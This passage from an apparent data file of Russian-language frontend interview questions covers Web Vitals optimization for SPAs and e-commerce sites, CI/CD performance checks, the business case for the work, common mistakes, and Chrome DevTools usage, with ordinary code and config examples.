точности:</strong></p><p><strong>По типам страниц:</strong></p><ul><li>Homepage vs Product vs Checkout</li><li>Разные оптимизации для разных типов</li></ul><p><strong>По устройствам:</strong></p><ul><li>Mobile часто хуже</li><li>Слабее CPU, медленнее сеть</li></ul><p><strong>По географии:</strong></p><ul><li>Удалённые регионы медленнее</li><li>CDN coverage проблемы</li></ul><p><strong>6. Correlation analysis:</strong></p><p><strong>Связь метрик:</strong></p><ul><li>Высокий TTFB → высокий LCP</li><li>Много long tasks → высокий INP</li><li>Ads загружаются → высокий CLS</li></ul><p><strong>7. Regression detection:</strong></p><p><strong>Сравнение периодов:</strong></p><ul><li>До и после deploy</li><li>LCP вырос с 2.1s до 3.5s</li><li>Что изменилось в deploy?</li></ul><p><strong>8. User flow анализ:</strong></p><p><strong>Критичные пути:</strong></p><ul><li>Homepage → Category → Product → Checkout</li><li>На каком шаге метрики хуже?</li><li>Bounce rate correlation</li></ul><p><strong>9. Third-party impact:</strong></p><p><strong>Измерение влияния:</strong></p><ul><li>Отключить analytics</li><li>Отключить chat widget</li><li>Отключить ads</li><li>Измерить улучшение</li></ul><p><strong>10. Практический пример диагностики:</strong></p><p><strong>Проблема: LCP = 4.2s (плохо)</strong></p><p><strong>Шаги:</strong></p><ol><li>Lighthouse → LCP breakdown</li><li>TTFB: 1.2s (плохо)</li><li>Resource load time: 2.8s (плохо)</li><li>Элемент: hero image (3MB)</li></ol><p><strong>Diagnosis:</strong></p><ul><li>Сервер медленно отвечает (TTFB)</li><li>Изображение слишком большое</li></ul><p><strong>Решения:</strong></p><ol><li>CDN для faster TTFB</li><li>Compress image (WebP, resize)</li><li>Preload hero image</li><li>Result: LCP = 1.8s ✅</li></ol>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'диагностика', 'debugging', 'анализ', 'производительность']
  },

  {
    id: 111,
    question: "Как оптимизировать Web Vitals для Single Page Applications (SPA)?",
    answer: "<p><strong>SPA создают уникальные вызовы</strong> для Web Vitals из-за client-side рендеринга и навигации.</p><p><strong>Особенности SPA:</strong></p><ul><li>JavaScript-heavy</li><li>Client-side routing</li><li>Асинхронная загрузка данных</li><li>Большой bundle size</li></ul><p><strong>1. LCP в SPA:</strong></p><p><strong>Проблемы:</strong></p><ul><li>Пустой HTML shell</li><li>Контент появляется после JS execution</li><li>LCP элемент загружается клиентом</li></ul><p><strong>Решения:</strong></p><p><strong>Server-Side Rendering (SSR):</strong></p><ul><li>// Next.js example</li><li>export async function getServerSideProps() {</li><li>  const data = await fetchData();</li><li>  return {props: {data}};</li><li>}</li><li>// HTML с контентом от сервера</li><li>// Hydration для интерактивности</li></ul><p><strong>Static Generation:</strong></p><ul><li>// Next.js</li><li>export async function getStaticProps() {</li><li>  return {props: {data}};</li><li>}</li><li>// Pre-render на build time</li><li>// Fastest initial load</li></ul><p><strong>Critical CSS inline:</strong></p><ul><li>// Встроить стили для above-fold</li><li>&lt;style&gt;.hero { /* ... */ }&lt;/style&gt;</li><li>// Остальное асинхронно</li></ul><p><strong>2. INP в SPA:</strong></p><p><strong>Проблемы:</strong></p><ul><li>Большое количество JavaScript</li><li>Framework overhead</li><li>Heavy re-renders</li></ul><p><strong>React оптимизации:</strong></p><ul><li>// Code splitting по routes</li><li>const Dashboard = lazy(() => import('./Dashboard'));</li><li>// Virtualization для списков</li><li>import {FixedSizeList} from 'react-window';</li><li>// Memo для дорогих вычислений</li><li>const value = useMemo(() => expensive(data), [data]);</li><li>// Debounce для search</li><li>const debouncedSearch = useMemo(</li><li>  () => debounce(handleSearch, 300),</li><li>  []</li><li>);</li></ul><p><strong>Bundle optimization:</strong></p><ul><li>// Tree shaking</li><li>import {specific} from 'lodash-es';</li><li>// Dynamic imports</li><li>const heavy = await import('./heavy-feature');</li><li>// Analyze bundle</li><li>// webpack-bundle-analyzer</li></ul><p><strong>3. CLS в SPA:</strong></p><p><strong>Проблемы при навигации:</strong></p><ul><li>Content placeholder → реальный контент</li><li>Loading states вызывают shifts</li></ul><p><strong>Решения:</strong></p><ul><li>// Skeleton с фиксированной высотой</li><li>.skeleton {</li><li>  min-height: 400px;</li><li>}</li><li>// Placeholder того же размера</li><li>&lt;div style={{minHeight: data ? 'auto' : '400px'}}&gt;</li><li>  {data ? &lt;Content /&gt; : &lt;Skeleton /&gt;}</li><li>&lt;/div&gt;</li></ul><p><strong>4. Client-side навигация и Web Vitals:</strong></p><p><strong>Soft navigation tracking:</strong></p><ul><li>// Измерение SPA навигации</li><li>const observer = new PerformanceObserver(list => {</li><li>  list.getEntries().forEach(entry => {</li><li>    if (entry.entryType === 'soft-navigation') {</li><li>      // Track как page view</li><li>      measureWebVitals();</li><li>    }</li><li>  });</li><li>});</li><li>observer.observe({entryTypes: ['soft-navigation']});</li></ul><p><strong>5. Prefetching и Preloading:</strong></p><p><strong>Next.js Link prefetch:</strong></p><ul><li>&lt;Link href=\"/dashboard\" prefetch&gt;</li><li>  Dashboard</li><li>&lt;/Link&gt;</li><li>// Prefetch при hover</li></ul><p><strong>Resource hints:</strong></p><ul><li>&lt;link rel=\"prefetch\" href=\"/api/data\"&gt;</li><li>&lt;link rel=\"preload\" href=\"critical.js\" as=\"script\"&gt;</li></ul><p><strong>6. Progressive Enhancement:</strong></p><ul><li>Базовый контент работает без JS</li><li>JS добавляет интерактивность</li><li>Fallback для slow connections</li></ul><p><strong>7. Framework-specific best practices:</strong></p><p><strong>React:</strong></p><ul><li>Suspense для lazy loading</li><li>useTransition для некритичных updates</li><li>React Server Components</li></ul><p><strong>Vue:</strong></p><ul><li>Async components</li><li>Nuxt.js для SSR</li><li>Keep-alive для caching</li></ul><p><strong>Angular:</strong></p><ul><li>Lazy loading modules</li><li>OnPush change detection</li><li>Angular Universal для SSR</li></ul><p><strong>8. Monitoring SPA-specific issues:</strong></p><ul><li>Track по route</li><li>Measure navigation time</li><li>Client-side vs initial load отдельно</li></ul><p><strong>Рекомендации для SPA:</strong></p><ul><li>✅ SSR/SSG где возможно</li><li>✅ Aggressive code splitting</li><li>✅ Optimize bundle size</li><li>✅ Use performance hints</li><li>✅ Monitor client-side navigation</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'SPA', 'React', 'оптимизация', 'SSR', 'performance']
  },

  {
    id: 112,
    question: "Как оптимизировать Web Vitals для e-commerce сайтов?",
    answer: "<p><strong>E-commerce сайты</strong> имеют специфические вызовы для Web Vitals из-за большого количества изображений, third-party сервисов и динамического контента.</p><p><strong>Особенности e-commerce:</strong></p><ul><li>Много product images</li><li>Reviews, ratings</li><li>Payment providers</li><li>Analytics, tracking</li><li>Personalization</li><li>Ads</li></ul><p><strong>1. Product pages LCP:</strong></p><p><strong>Главные проблемы:</strong></p><ul><li>Product image — часто LCP элемент</li><li>Большой размер изображений</li><li>Множество вариантов (цвета, размеры)</li></ul><p><strong>Оптимизации:</strong></p><ul><li>// Priority hint для главного изображения</li><li>&lt;img src=\"product-main.jpg\" </li><li>     fetchpriority=\"high\"</li><li>     width=\"800\" height=\"800\"&gt;</li><li>// Preload</li><li>&lt;link rel=\"preload\" </li><li>      href=\"product-main.jpg\" </li><li>      as=\"image\"&gt;</li><li>// Lazy для thumbnails</li><li>&lt;img src=\"thumb-1.jpg\" loading=\"lazy\"&gt;</li></ul><p><strong>Responsive images:</strong></p><ul><li>&lt;picture&gt;</li><li>  &lt;source media=\"(min-width: 1024px)\" </li><li>          srcset=\"large.webp\"&gt;</li><li>  &lt;source media=\"(min-width: 768px)\" </li><li>          srcset=\"medium.webp\"&gt;</li><li>  &lt;img src=\"small.webp\" alt=\"Product\"&gt;</li><li>&lt;/picture&gt;</li></ul><p><strong>2. Category/Listing pages:</strong></p><p><strong>Проблемы:</strong></p><ul><li>Десятки product cards</li><li>Каждая с изображением</li><li>Filters, sorting</li></ul><p><strong>Image optimization:</strong></p><ul><li>// Lazy loading после first screen</li><li>&lt;img src=\"product.jpg\" </li><li>     loading=\"lazy\"</li><li>     width=\"300\" height=\"300\"&gt;</li><li>// Image CDN с автооптимизацией</li><li>&lt;img src=\"https://cdn.shop.com/product.jpg?w=300&format=webp\"&gt;</li></ul><p><strong>Infinite scroll vs Pagination:</strong></p><ul><li>Pagination лучше для Web Vitals</li><li>Если infinite scroll — virtual scrolling</li><li>Reserve space для новых items</li></ul><p><strong>3. Checkout flow INP:</strong></p><p><strong>Проблемы:</strong></p><ul><li>Form validation</li><li>Address autocomplete</li><li>Payment processing</li><li>Real-time updates (shipping cost)</li></ul><p><strong>Оптимизации:</strong></p><ul><li>// Debounce для autocomplete</li><li>const debouncedSearch = debounce(searchAddress, 300);</li><li>// Async validation</li><li>async function validateCard(number) {</li><li>  await yieldToMain();</li><li>  return luhnCheck(number);</li><li>}</li><li>// Optimize third-party scripts</li><li>&lt;script src=\"stripe.js\" defer&gt;&lt;/script&gt;</li></ul><p><strong>4. Third-party scripts management:</strong></p><p><strong>Типичные third-party:</strong></p><ul><li>Analytics (GA, Hotjar)</li><li>Reviews (Trustpilot, Yotpo)</li><li>Live chat (Intercom, Zendesk)</li><li>Payment (Stripe, PayPal)</li><li>A/B testing (Optimizely)</li></ul><p><strong>Стратегии:</strong></p><ul><li>// Lazy load chat</li><li>window.addEventListener('scroll', () => {</li><li>  if (!chatLoaded && scrolledPast50Percent()) {</li><li>    loadChat();</li><li>    chatLoaded = true;</li><li>  }</li><li>}, {once: true});</li><li>// Facade pattern для embeds</li><li>// Show screenshot, load real embed on click</li></ul><p><strong>5. CLS от ads и recommendations:</strong></p><p><strong>Проблемы:</strong></p><ul><li>\"You may also like\" widget</li><li>Banner ads динамического размера</li><li>Customer reviews загружаются асинхронно</li></ul><p><strong>Решения:</strong></p><ul><li>// Reserve space</li><li>.recommendations-container {</li><li>  min-height: 400px;</li><li>}</li><li>// Fixed ad slots</li><li>.ad-slot {</li><li>  width: 300px;</li><li>  height: 250px;</li><li>  background: #f0f0f0;</li><li>}</li></ul><p><strong>6. Reviews и ratings:</strong></p><ul><li>// Lazy load ниже fold</li><li>&lt;div id=\"reviews\" style=\"min-height: 600px\"&gt;</li><li>  &lt;script&gt;</li><li>    window.addEventListener('scroll', () => {</li><li>      if (isInViewport('#reviews')) {</li><li>        loadReviews();</li><li>      }</li><li>    });</li><li>  &lt;/script&gt;</li><li>&lt;/div&gt;</li></ul><p><strong>7. Mobile optimization (критично для e-commerce):</strong></p><ul><li>Меньше изображений on screen</li><li>Simplified checkout</li><li>Tap targets достаточно большие</li><li>Avoid intrusive interstitials</li></ul><p><strong>8. Personalization без деградации:</strong></p><ul><li>// Edge computing для персонализации</li><li>// Cloudflare Workers, Fastly Compute</li><li>// Server-side вместо client-side</li></ul><p><strong>Business impact метрики:</strong></p><ul><li>Conversion rate по Web Vitals segments</li><li>LCP < 2.5s → Conversion X%</li><li>LCP > 4s → Conversion Y%</li><li>ROI оптимизаций</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'e-commerce', 'оптимизация', 'images', 'third-party']
  },

  {
    id: 113,
    question: "Какие инструменты CI/CD можно использовать для контроля Web Vitals?",
    answer: "<p><strong>Автоматизация проверки Web Vitals в CI/CD</strong> позволяет предотвратить деградацию производительности до продакшена.</p><p><strong>1. Lighthouse CI:</strong></p><p><strong>Установка и настройка:</strong></p><ul><li>npm install -g @lhci/cli</li><li>// lighthouserc.js</li><li>module.exports = {</li><li>  ci: {</li><li>    collect: {</li><li>      url: ['http://localhost:3000'],</li><li>      numberOfRuns: 3,</li><li>    },</li><li>    assert: {</li><li>      assertions: {</li><li>        'categories:performance': ['error', {minScore: 0.9}],</li><li>        'largest-contentful-paint': ['error', {maxNumericValue: 2500}],</li><li>        'cumulative-layout-shift': ['error', {maxNumericValue: 0.1}],</li><li>        'total-blocking-time': ['error', {maxNumericValue: 300}],</li><li>      },</li><li>    },</li><li>    upload: {</li><li>      target: 'temporary-public-storage',</li><li>    },</li><li>  },</li><li>};</li></ul><p><strong>GitHub Actions интеграция:</strong></p><ul><li># .github/workflows/lighthouse.yml</li><li>name: Lighthouse CI</li><li>on: [pull_request]</li><li>jobs:</li><li>  lighthouse:</li><li>    runs-on: ubuntu-latest</li><li>    steps:</li><li>      - uses: actions/checkout@v3</li><li>      - uses: actions/setup-node@v3</li><li>      - run: npm ci</li><li>      - run: npm run build</li><li>      - run: npm start & # start server</li><li>      - run: lhci autorun</li></ul><p><strong>2. Performance Budgets:</strong></p><p><strong>Определение бюджетов:</strong></p><ul><li>// budget.json</li><li>[</li><li>  {</li><li>    \"resourceSizes\": [</li><li>      {\"resourceType\": \"script\", \"budget\": 300},</li><li>      {\"resourceType\": \"image\", \"budget\": 500},</li><li>      {\"resourceType\": \"total\", \"budget\": 1000}</li><li>    ],</li><li>    \"timings\": [</li><li>      {\"metric\": \"interactive\", \"budget\": 3000},</li><li>      {\"metric\": \"first-contentful-paint\", \"budget\": 1500}</li><li>    ]</li><li>  }</li><li>]</li></ul><p><strong>Webpack budget plugin:</strong></p><ul><li>// webpack.config.js</li><li>module.exports = {</li><li>  performance: {</li><li>    maxAssetSize: 300000,</li><li>    maxEntrypointSize: 500000,</li><li>    hints: 'error',</li><li>  },</li><li>};</li></ul><p><strong>3. SpeedCurve Deploy:</strong></p><ul><li>// После deploy</li><li>curl -X POST https://api.speedcurve.com/v1/deploys </li><li>  -d \"site_id=YOUR_SITE\" </li><li>  -d \"note=Deploy $COMMIT_SHA\"</li><li>// Автоматический Lighthouse run</li><li>// Сравнение с baseline</li></ul><p><strong>4. WebPageTest API:</strong></p><ul><li>// run-wpt.js</li><li>const WebPageTest = require('webpagetest');</li><li>const wpt = new WebPageTest('www.webpagetest.org', 'API_KEY');</li><li>wpt.runTest('https://example.com', {</li><li>  location: 'Dulles:Chrome',</li><li>  connectivity: '3G',</li><li>}, (err, result) => {</li><li>  const lcp = result.data.median.firstView.chromeUserTiming.LargestContentfulPaint;</li><li>  if (lcp > 2500) {</li><li>    process.exit(1); // Fail CI</li><li>  }</li><li>});</li></ul><p><strong>5. Playwright Performance Testing:</strong></p><ul><li>// performance.test.js</li><li>import {test, expect} from '@playwright/test';</li><li>test('Web Vitals check', async ({page}) => {</li><li>  await page.goto('https://example.com');</li><li>  const lcp = await page.evaluate(() => {</li><li>    return new Promise(resolve => {</li><li>      new PerformanceObserver(list => {</li><li>        const entries = list.getEntries();</li><li>        const lastEntry = entries[entries.length - 1];</li><li>        resolve(lastEntry.renderTime || lastEntry.loadTime);</li><li>      }).observe({type: 'largest-contentful-paint', buffered: true});</li><li>    });</li><li>  });</li><li>  expect(lcp).toBeLessThan(2500);</li><li>});</li></ul><p><strong>6. Bundle Analysis в CI:</strong></p><ul><li>// Compare bundle sizes</li><li>npm run build</li><li>npx bundlesize</li><li>// .bundlesizerc.json</li><li>{</li><li>  \"files\": [</li><li>    {\"path\": \"dist/main.js\", \"maxSize\": \"300 kB\"},</li><li>    {\"path\": \"dist/vendor.js\", \"maxSize\": \"500 kB\"}</li><li>  ]</li><li>}</li></ul><p><strong>7. Visual Regression + Web Vitals:</strong></p><ul><li>// Percy + Lighthouse</li><li>// Проверка что визуальные изменения</li><li>// Не ухудшили Web Vitals</li></ul><p><strong>8. PR комментарии с результатами:</strong></p><ul><li>// GitHub Action comment</li><li>- uses: actions/github-script@v6</li><li>  with:</li><li>    script: |</li><li>      github.rest.issues.createComment({</li><li>        issue_number: context.issue.number,</li><li>        body: `## Lighthouse Results</li><li>        LCP: ${lcp}ms</li><li>        CLS: ${cls}</li><li>        TBT: ${tbt}ms`</li><li>      })</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Run на каждом PR</li><li>✅ Multiple runs для стабильности (3-5)</li><li>✅ Realistic test conditions (throttling)</li><li>✅ Compare против baseline</li><li>✅ Fail CI при значительной деградации</li><li>✅ Track trends во времени</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'CI/CD', 'автоматизация', 'Lighthouse', 'тестирование']
  },

  {
    id: 114,
    question: "Как объяснить бизнесу важность Web Vitals и обосновать инвестиции в оптимизацию?",
    answer: "<p><strong>Обоснование инвестиций в Web Vitals</strong> требует перевода технических метрик в бизнес-показатели.</p><p><strong>Прямое влияние на бизнес-метрики:</strong></p><p><strong>1. Конверсия и выручка:</strong></p><p><strong>Реальные кейсы:</strong></p><ul><li><strong>Amazon:</strong> каждые 100ms задержки = -1% продаж</li><li><strong>Walmart:</strong> улучшение на 1 секунду = +2% конверсии</li><li><strong>Pinterest:</strong> уменьшение load time на 40% = +15% sign-ups</li><li><strong>Mobify:</strong> уменьшение load time на 1 секунду = +27% конверсии</li></ul><p><strong>Расчёт для вашего бизнеса:</strong></p><ul><li>Текущая конверсия: 2%</li><li>Месячный трафик: 100,000 посетителей</li><li>Средний чек: $50</li><li>Текущая выручка: 100,000 × 2% × $50 = $100,000</li><li>Улучшение LCP с 4s до 2s → +10% конверсии</li><li>Новая выручка: 100,000 × 2.2% × $50 = $110,000</li><li>Прирост: $10,000/месяц = $120,000/год</li></ul><p><strong>2. SEO и органический трафик:</strong></p><p><strong>Page Experience ranking signal:</strong></p><ul><li>Хорошие Web Vitals = ranking boost</li><li>При равной релевантности выигрывает быстрый сайт</li><li>Mobile-first indexing учитывает mobile Web Vitals</li></ul><p><strong>Финансовое влияние:</strong></p><ul><li>Органический трафик: 50% от общего</li><li>Улучшение позиций на 2-3 места</li><li>Прирост трафика: +15-20%</li><li>Дополнительная выручка без затрат на рекламу</li></ul><p><strong>3. User Experience метрики:</strong></p><p><strong>Bounce Rate:</strong></p><ul><li>53% пользователей уходят если загрузка > 3 сек</li><li>Каждая секунда задержки = +10% bounce rate</li><li>Улучшение LCP → снижение bounce rate</li><li>Больше engagement → выше конверсия</li></ul><p><strong>Customer Satisfaction:</strong></p><ul><li>Быстрый сайт = довольные пользователи</li><li>Net Promoter Score растёт</li><li>Меньше негативных отзывов</li><li>Больше повторных визитов</li></ul><p><strong>4. Мобильные пользователи (критично):</strong></p><ul><li>60-70% трафика с mobile</li><li>Mobile пользователи менее терпеливы</li><li>Медленная загрузка = потерянные продажи</li><li>Mobile Web Vitals особенно важны</li></ul><p><strong>5. Competitive advantage:</strong></p><ul><li>Большинство конкурентов игнорируют Web Vitals</li><li>Быстрый сайт = дифференциация</li><li>Первое впечатление решающее</li></ul><p><strong>Презентация для стейкхолдеров:</strong></p><p><strong>Структура презентации:</strong></p><ol><li><strong>Проблема:</strong> \"Наши Web Vitals в зоне риска\"</li><li><strong>Данные:</strong> Текущие метрики и их бизнес-влияние</li><li><strong>Opportunity:</strong> Что можем улучшить</li><li><strong>ROI:</strong> Финансовое обоснование</li><li><strong>План действий:</strong> Как и когда</li></ol><p><strong>Ключевые слайды:</strong></p><ul><li>📊 Current State: \"75% пользователей видят плохой LCP\"</li><li>💰 Revenue Impact: \"Теряем $120K/год из-за медленной загрузки\"</li><li>📈 Opportunity: \"Улучшение на 2 секунды = +15% конверсии\"</li><li>💵 ROI: \"$50K инвестиция → $120K годовой прирост выручки\"</li><li>⏱️ Timeline: \"3 месяца до результатов\"</li></ul><p><strong>Язык для бизнеса:</strong></p><p><strong>Избегать:</strong></p><ul><li>❌ \"Largest Contentful Paint 4.2 секунды\"</li><li>❌ \"Main thread блокировки\"</li><li>❌ \"Layout shift score 0.25\"</li></ul><p><strong>Говорить:</strong></p><ul><li>✅ \"Пользователи ждут 4+ секунды до контента\"</li><li>✅ \"Сайт тормозит при взаимодействии\"</li><li>✅ \"Элементы прыгают, пользователи кликают не туда\"</li><li>✅ \"Теряем X продаж ежемесячно\"</li></ul><p><strong>Ответы на возражения:</strong></p><p><strong>\"Это дорого\":</strong></p><ul><li>ROI расчёт показывает окупаемость за 3-6 месяцев</li><li>Каждый месяц промедления = потерянная выручка</li><li>Конкуренты уже оптимизируют</li></ul><p><strong>\"У нас другие приоритеты\":</strong></p><ul><li>Web Vitals влияют на ВСЕ метрики</li><li>Плохая производительность убивает любые новые фичи</li><li>Быстрый сайт — foundation для роста</li></ul><p><strong>\"Наши пользователи не жалуются\":</strong></p><ul><li>Они просто уходят молча (bounce rate)</li><li>Lost customers не оставляют отзывов</li><li>Data показывает реальную картину</li></ul><p><strong>Pilot project подход:</strong></p><ol><li>Начать с одной критичной страницы (homepage)</li><li>Измерить impact за месяц</li><li>Показать результаты</li><li>Scale на остальные страницы</li></ol><p><strong>Success metrics для tracking:</strong></p><ul><li>Web Vitals улучшение (technical)</li><li>Conversion rate прирост (business)</li><li>Bounce rate снижение (UX)</li><li>Revenue увеличение (financial)</li><li>Customer satisfaction (NPS)</li></ul><p><strong>Долгосрочная перспектива:</strong></p><ul><li>Не one-time проект</li><li>Continuous monitoring и improvement</li><li>Performance culture в команде</li><li>Competitive moat</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'бизнес', 'ROI', 'конверсия', 'презентация', 'обоснование']
  },

  {
    id: 115,
    question: "Какие распространённые ошибки делают при оптимизации Web Vitals?",
    answer: "<p><strong>Типичные ошибки при оптимизации Web Vitals</strong> могут свести на нет все усилия или даже ухудшить ситуацию.</p><p><strong>1. Фокус только на Lab Data:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Оптимизация только под Lighthouse score</li><li>Игнорирование реальных пользователей (Field Data)</li><li>\"Lighthouse показывает 95, значит всё ОК\"</li></ul><p><strong>Почему плохо:</strong></p><ul><li>Lab условия ≠ реальный мир</li><li>Google использует CrUX (Field Data) для ranking</li><li>Реальные пользователи на медленных устройствах/сетях</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ Lab data для debugging</li><li>✅ Field data для валидации</li><li>✅ Мониторинг RUM обязателен</li></ul><p><strong>2. Over-optimization одной метрики:</strong></p><p><strong>Ошибка:</strong></p><ul><li>\"Сделаем LCP идеальным любой ценой\"</li><li>Жертвуем другими метриками или UX</li></ul><p><strong>Примеры:</strong></p><ul><li>Aggressive lazy loading → плохой UX</li><li>Убрали все изображения → хороший LCP, но потеря конверсии</li><li>Inline всего CSS → раздутый HTML</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ Баланс всех Core Web Vitals</li><li>✅ UX важнее чистой метрики</li><li>✅ Business goals > perfect scores</li></ul><p><strong>3. Игнорирование Mobile:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Оптимизация только desktop</li><li>\"На моём MacBook всё быстро\"</li><li>Тестирование на мощном компьютере</li></ul><p><strong>Реальность:</strong></p><ul><li>60-70% трафика с mobile</li><li>Mobile устройства медленнее</li><li>3G/4G медленнее WiFi</li><li>Google использует mobile-first indexing</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ Mobile-first подход</li><li>✅ Тестирование на реальных устройствах</li><li>✅ Network throttling в DevTools</li></ul><p><strong>4. Преждевременная оптимизация:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Micro-optimizations без измерений</li><li>\"Давайте оптимизируем всё подряд\"</li><li>Тратим время на несущественное</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ Measure first</li><li>✅ Identify bottlenecks</li><li>✅ Prioritize high-impact changes</li><li>✅ Validate improvements</li></ul><p><strong>5. Ломающие изменения для метрик:</strong></p><p><strong>Примеры:</strong></p><ul><li>Удалили важный контент для LCP</li><li>Убрали аналитику для TBT</li><li>Сломали функциональность</li></ul><p><strong>Помните:</strong></p><ul><li>Метрики — средство, не цель</li><li>Цель — лучший UX и бизнес результаты</li><li>Perfect scores бесполезны если сайт не работает</li></ul><p><strong>6. Забыли про Third-Party скрипты:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Оптимизировали свой код</li><li>Но analytics, ads, chat съедают весь эффект</li><li>\"Это не наш код, ничего не сделаешь\"</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ Audit всех third-party</li><li>✅ Lazy load некритичных</li><li>✅ Facades для embeds</li><li>✅ Удалить неиспользуемые</li></ul><p><strong>7. Нет continuous monitoring:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Оптимизировали один раз</li><li>Не отслеживаем регрессии</li><li>\"Год назад было хорошо\"</li></ul><p><strong>Реальность:</strong></p><ul><li>Новые фичи ухудшают метрики</li><li>Dependencies обновляются</li><li>Third-party скрипты меняются</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ RUM мониторинг 24/7</li><li>✅ Alerts при деградации</li><li>✅ CI/CD проверки</li><li>✅ Regular audits</li></ul><p><strong>8. Неправильные размеры изображений:</strong></p><p><strong>Ошибки:</strong></p><ul><li>Width/height в CSS, но не в HTML</li><li>Aspect-ratio без размеров</li><li>Responsive без srcset</li></ul><p><strong>Результат:</strong></p><ul><li>Layout shifts</li><li>Медленная загрузка</li><li>Плохой CLS и LCP</li></ul><p><strong>9. Cargo cult оптимизации:</strong></p><p><strong>Ошибка:</strong></p><ul><li>\"Прочитал что надо preload, preload всё\"</li><li>Копирование без понимания</li><li>Over-engineering</li></ul><p><strong>Примеры:</strong></p><ul><li>Preload некритичных ресурсов</li><li>Prefetch того что не нужно</li><li>Inline слишком много CSS</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ Понимать зачем делаешь</li><li>✅ Измерять результат</li><li>✅ Start simple</li></ul><p><strong>10. Игнорирование browser caching:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Нет cache headers</li><li>Или слишком короткий TTL</li><li>Пользователи загружают всё заново</li></ul><p><strong>Правильно:</strong></p><ul><li>// Static assets</li><li>Cache-Control: public, max-age=31536000, immutable</li><li>// HTML</li><li>Cache-Control: no-cache</li><li>// API responses</li><li>Cache-Control: private, max-age=300</li></ul><p><strong>11. Забыли про Core Web Vitals пороги:</strong></p><p><strong>Ошибка:</strong></p><ul><li>LCP 2.6s — \"Почти хорошо!\"</li><li>Но нужно ≤ 2.5s для \"Good\"</li><li>75-й перцентиль, не среднее</li></ul><p><strong>Важно:</strong></p><ul><li>Пороги строгие</li><li>75% пользователей должны быть в \"Good\"</li><li>Не 2.5s average, а p75 ≤ 2.5s</li></ul><p><strong>12. Отсутствие A/B тестирования:</strong></p><p><strong>Ошибка:</strong></p><ul><li>Deploy оптимизаций на всех сразу</li><li>Не знаем реальный impact</li><li>Correlation ≠ causation</li></ul><p><strong>Правильно:</strong></p><ul><li>✅ A/B test значимых изменений</li><li>✅ Measure business metrics</li><li>✅ Validate assumptions</li></ul><p><strong>Best Practices чтобы избежать ошибок:</strong></p><ul><li>✅ Measure → Analyze → Optimize → Validate</li><li>✅ Focus on Field Data</li><li>✅ Mobile-first approach</li><li>✅ Balance всех метрик</li><li>✅ UX и business > perfect scores</li><li>✅ Continuous monitoring</li><li>✅ Learn from mistakes</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'ошибки', 'best practices', 'оптимизация', 'антипаттерны']
  },

  {
    id: 116,
    question: "Какие инструменты Chrome DevTools ты используешь чаще всего в повседневной работе?",
    answer: "<p><strong>Наиболее часто используемые инструменты DevTools</strong> зависят от задач, но есть базовый набор для ежедневной работы.</p><p><strong>Elements panel (каждый день):</strong></p><p><strong>Основное применение:</strong></p><ul><li>Инспектирование DOM структуры</li><li>Debugging CSS — какие стили применены</li><li>Live editing для быстрого прототипирования</li><li>Проверка accessibility атрибутов</li></ul><p><strong>Любимые фичи:</strong></p><ul><li>Computed styles — видно откуда пришёл стиль</li><li>Box model visualizer</li><li>:hov для тестирования состояний</li><li>Force element state (hover, focus, active)</li></ul><p><strong>Console (постоянно открыта):</strong></p><p><strong>Для чего:</strong></p><ul><li>Errors и warnings</li><li>Быстрое тестирование JavaScript</li><li>Логирование для debugging</li><li>Работа с API прямо в консоли</li></ul><p><strong>Полезные команды:</strong></p><ul><li>$0 — последний выбранный элемент</li><li>copy() — скопировать в буфер</li><li>console.table() для объектов</li><li>Live expressions для мониторинга</li></ul><p><strong>Network panel (часто):</strong></p><p><strong>Задачи:</strong></p><ul><li>Проверка API запросов/ответов</li><li>Debugging failed requests</li><li>Анализ времени загрузки</li><li>Проверка headers, cookies</li></ul><p><strong>Фильтры использую:</strong></p><ul><li>XHR/Fetch только</li><li>Failed requests</li><li>По домену третьих сторон</li></ul><p><strong>Sources panel (при debugging):</strong></p><p><strong>Основное:</strong></p><ul><li>Breakpoints для step-by-step</li><li>Watch expressions</li><li>Call stack анализ</li><li>Local/Global scope inspection</li></ul><p><strong>Application panel (периодически):</strong></p><ul><li>LocalStorage/SessionStorage проверка</li><li>Cookies management</li><li>Service Workers status</li><li>Cache Storage</li></ul><p><strong>Частота использования:</strong></p><ul><li>🔥 Каждый день: Elements, Console, Network</li><li>⭐ Несколько раз в неделю: Sources, Application</li><li>📊 По необходимости: Performance, Memory, Lighthouse</li></ul>",
    difficulty: 'junior',
    tags: ['Chrome DevTools', 'инструменты', 'debugging', 'workflow']
  },

  {
    id: 117,
    question: "Как ты используешь Performance Profiler в Chrome DevTools?",
    answer: "<p><strong>Performance Profiler</strong> — мощный инструмент для анализа runtime производительности.</p><p><strong>Когда использую Performance panel:</strong></p><p><strong>Типичные сценарии:</strong></p><ul><li>⚠️ Пользователи жалуются на \"лаги\"</li><li>⚠️ Медленный scroll или анимации</li><li>⚠️ Долгая загрузка страницы</li><li>⚠️ Высокий INP в метриках</li></ul><p><strong>Процесс профилирования:</strong></p><p><strong>1. Подготовка:</strong></p><ul><li>Открыть Incognito (без расширений)</li><li>Throttling CPU 4x slowdown (для эмуляции слабых устройств)</li><li>Network throttling на Fast 3G</li><li>Clear cache если нужно first load</li></ul><p><strong>2. Запись профиля:</strong></p><ul><li>Performance panel → Record</li><li>Воспроизвести проблему (scroll, click, etc)</li><li>Stop после 5-10 секунд</li><li>Не записывать слишком долго — профиль станет огромным</li></ul><p><strong>3. Анализ результатов:</strong></p><p><strong>Main thread flame chart:</strong></p><ul><li>Ищу длинные задачи (long tasks > 50ms)</li><li>Красные углы = потенциальная проблема</li><li>Желтый 